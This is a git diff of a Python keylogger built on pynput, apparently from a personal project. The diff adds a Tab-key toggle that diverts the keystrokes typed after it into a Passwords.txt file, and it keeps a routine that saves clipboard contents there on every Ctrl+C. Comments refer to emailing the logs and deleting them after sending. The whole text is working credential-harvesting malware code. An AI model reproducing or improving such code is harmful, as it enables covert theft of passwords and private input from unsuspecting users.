@@ -11,10 +11,11 @@ from pynput import mouse
 import os
 from pynput.keyboard import Key
 
-Tab_password = ["click", ""]
+tab_key = False
 Arr_mouse = []  # an arr to hold the mouse inputs
 Arr_key = []  # an arr to hold the mouse inputs
 count_M_move = 0  # made so that the log file won't be filed with mouse positions
+Arr_Password = []
 
 # the data in this section is a burnout. you can change it or enter the email for testing
 #####################################
@@ -47,10 +48,20 @@ def on_click(x, y, button, pressed):  # tracks the clicks of the mouse
 
 
 def on_press(key):  # tracks the key press of the keyboard
-    global Arr_key
-    Arr_key.append(key)
-    write_to_Log_file(Arr_key)
-    Arr_key = []
+    global Arr_key, tab_key
+    if key == Key.tab:
+        if not tab_key:
+            tab_key = True
+        else:
+            tab_key = False
+    if tab_key:
+        Arr_key.append(key)
+        write_to_Passwords_file(Arr_key)
+        Arr_key = []
+    else:
+        Arr_key.append(key)
+        write_to_Log_file(Arr_key)
+        Arr_key = []
 
 
 def on_release(key):  # tracks the key release of the keyboard
@@ -74,7 +85,7 @@ def write_to_Log_file(keys):
                 f.write(' ')
             elif k.find("x03") > 0:  # if the user did a ctrl+c
                 text = clipboard.paste()
-                write_to_Passwords_file(text)
+                write_to_Passwords_file_ctrl(text)
                 f.write('\n')
             elif k.find("Key") == -1:
                 if get_capslock_state():
@@ -90,7 +101,21 @@ def write_to_Log_file(keys):
     #     os.remove("Log.txt")  # after the sending the file will be deleted
 
 
-def write_to_Passwords_file(text):
+def write_to_Passwords_file(keys):
+    with open("Passwords.txt", 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("enter") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                if get_capslock_state():
+                    f.write(k.upper())
+                else:
+                    f.write(k)
+    f.close()
+
+
+def write_to_Passwords_file_ctrl(text):
     with open("Passwords.txt", 'a') as f:
         f.write(text + '\n')
     f.close()
